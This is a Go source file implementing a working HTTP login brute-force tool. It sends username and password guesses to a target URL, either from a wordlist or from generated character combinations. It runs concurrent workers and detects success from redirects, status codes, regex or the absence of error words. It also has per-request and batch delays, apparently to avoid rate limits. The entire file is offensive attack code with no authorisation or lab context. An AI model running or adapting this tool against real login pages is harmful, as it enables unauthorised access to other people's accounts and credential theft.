package proxy

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

type AttackConfig struct {
	TargetURL    string
	Username     string
	Wordlist     string
	UserField    string // default "username"
	PassField    string // default "password"
	SuccessRegex string // optional regex to check in response body
	Concurrency  int    // number of workers
	IsJSON       bool   // if true, send as JSON instead of form-urlencoded
	DelayMs      int    // Delay between each request
	BatchSize    int    // Number of requests before a longer batch delay
	BatchDelayMs int    // Longer delay after BatchSize requests
	ExpectedStatus int  // Status code to check
	StatusIsSuccess bool // True: ExpectedStatus means success; False: ExpectedStatus means failure
	GenCharset     string // Characters to use if wordlist is empty
	GenMaxLen      int    // Max length for generated passwords
}

type AttackProgressMsg struct {
	AttemptCount int
	Password     string
	Status       string // "Running", "Success", "Failed", "Error"
	FinalURL     string
	ErrorMsg     string
}

type attackJob struct {
	password string
	attempt  int
}

type attackResult struct {
	password string
	attempt  int
	success  bool
	finalURL string
	err      error
}

func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg) {
	if config.UserField == "" {
		config.UserField = "username"
	}
	if config.PassField == "" {
		config.PassField = "password"
	}
	if config.Concurrency <= 0 {
		config.Concurrency = 1
	}
	if config.GenCharset == "" {
		config.GenCharset = "abcdefghijklmnopqrstuvwxyz0123456789"
	}
	if config.GenMaxLen <= 0 {
		config.GenMaxLen = 4 // Default safety limit
	}

	var scanner *bufio.Scanner
	var file *os.File
	var err error
	if config.Wordlist != "" {
		file, err = os.Open(config.Wordlist)
		if err != nil {
			updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error opening wordlist: %v", err)}
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	}

	var successRegex *regexp.Regexp
	if config.SuccessRegex != "" {
		successRegex, err = regexp.Compile(config.SuccessRegex)
		if err != nil {
			updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Invalid Success Regex: %v", err)}
			return
		}
	}

	jobs := make(chan attackJob, config.Concurrency*2)
	results := make(chan attackResult)
	done := make(chan bool)

	var wg sync.WaitGroup

	// Workers
	for w := 0; w < config.Concurrency; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{
				Timeout: 10 * time.Second,
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse // don't follow redirects, we want to check them
				},
			}

			for job := range jobs {
				res := attackResult{password: job.password, attempt: job.attempt}

				var reqBody io.Reader
				contentType := "application/x-www-form-urlencoded"

				if config.IsJSON {
					contentType = "application/json"
					payload := map[string]string{
						config.UserField: config.Username,
						config.PassField: job.password,
					}
					jsonBytes, _ := json.Marshal(payload)
					reqBody = bytes.NewReader(jsonBytes)
				} else {
					data := url.Values{}
					data.Set(config.UserField, config.Username)
					data.Set(config.PassField, job.password)
					reqBody = strings.NewReader(data.Encode())
				}

				req, err := http.NewRequest("POST", config.TargetURL, reqBody)
				if err != nil {
					res.err = err
					results <- res
					continue
				}
				req.Header.Add("Content-Type", contentType)

				resp, err := client.Do(req)
				if err != nil {
					res.err = err
					results <- res
					continue
				}

				bodyBytes, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				res.finalURL = resp.Request.URL.String()
				
				// Success detection logic
				if config.ExpectedStatus > 0 {
					match := resp.StatusCode == config.ExpectedStatus
					if config.StatusIsSuccess {
						res.success = match
					} else {
						res.success = !match
					}
				} else if resp.StatusCode == 302 || resp.StatusCode == 301 {
					// Redirect is usually a sign of success in login forms
					res.success = true
					res.finalURL = resp.Header.Get("Location")
				} else if successRegex != nil {
					// Check regex in body
					if successRegex.Match(bodyBytes) {
						res.success = true
					}
				} else {
					// Fallback: Check if status is 200 and body doesn't contain common error words
					bodyStr := strings.ToLower(string(bodyBytes))
					if resp.StatusCode >= 200 && resp.StatusCode < 300 {
						if !strings.Contains(bodyStr, "incorrect") && 
						   !strings.Contains(bodyStr, "invalid") && 
						   !strings.Contains(bodyStr, "failed") &&
						   !strings.Contains(bodyStr, "hata") {
							res.success = true
						}
					}
				}

				results <- res

				// Delay logic
				if config.DelayMs > 0 {
					time.Sleep(time.Duration(config.DelayMs) * time.Millisecond)
				}
				if config.BatchSize > 0 && job.attempt % config.BatchSize == 0 {
					if config.BatchDelayMs > 0 {
						time.Sleep(time.Duration(config.BatchDelayMs) * time.Millisecond)
					}
				}
			}
		}()
	}

	// Result collector
	var finalResult *attackResult
	go func() {
		for res := range results {
			if res.success && finalResult == nil {
				fr := res
				finalResult = &fr
			}
			if finalResult == nil {
				updateChan <- AttackProgressMsg{
					AttemptCount: res.attempt,
					Password:     res.password,
					Status:       "Running",
				}
			}
		}
		done <- true
	}()

	// Scanner or Generator
	attemptCount := 0
	if scanner != nil {
		for scanner.Scan() {
			if finalResult != nil { break }
			password := strings.TrimSpace(scanner.Text())
			if password == "" { continue }
			attemptCount++
			jobs <- attackJob{password: password, attempt: attemptCount}
		}
	} else {
		// Generate combinations
		chars := []rune(config.GenCharset)
		var generate func(prefix string, length int) bool
		generate = func(prefix string, length int) bool {
			if length == 0 {
				if finalResult != nil { return true }
				attemptCount++
				jobs <- attackJob{password: prefix, attempt: attemptCount}
				return false
			}
			for _, c := range chars {
				if generate(prefix+string(c), length-1) { return true }
			}
			return false
		}

		for l := 1; l <= config.GenMaxLen; l++ {
			if generate("", l) { break }
		}
	}
	close(jobs)
	wg.Wait()
	close(results)
	<-done

	if finalResult != nil {
		updateChan <- AttackProgressMsg{
			AttemptCount: finalResult.attempt,
			Password:     finalResult.password,
			Status:       "Success",
			FinalURL:     finalResult.finalURL,
		}
		return
	}

	if scanner != nil {
		if err := scanner.Err(); err != nil {
			updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error reading wordlist: %v", err)}
			return
		}
	}

	updateChan <- AttackProgressMsg{Status: "Failed"}
}

func RunBruteForce(config AttackConfig) {
	fmt.Println("Starting brute force attack tool...")
	fmt.Printf("Target: %s\n", config.TargetURL)
	fmt.Printf("Username: %s\n", config.Username)
	fmt.Printf("Wordlist: %s\n", config.Wordlist)
	
	updateChan := make(chan AttackProgressMsg)
	go RunBruteForceUI(config, updateChan)

	for msg := range updateChan {
		switch msg.Status {
		case "Running":
			fmt.Printf("\rAttempt %d: Trying password '%s'...", msg.AttemptCount, msg.Password)
		case "Success":
			fmt.Printf("\n[+] SUCCESS! Password found: %s\n", msg.Password)
			fmt.Printf("[+] Final URL reached: %s\n", msg.FinalURL)
			return
		case "Failed":
			fmt.Printf("\n[-] Attack finished. Password not found.\n")
			return
		case "Error":
			fmt.Printf("\n[!] Error: %s\n", msg.ErrorMsg)
			return
		}
	}
}


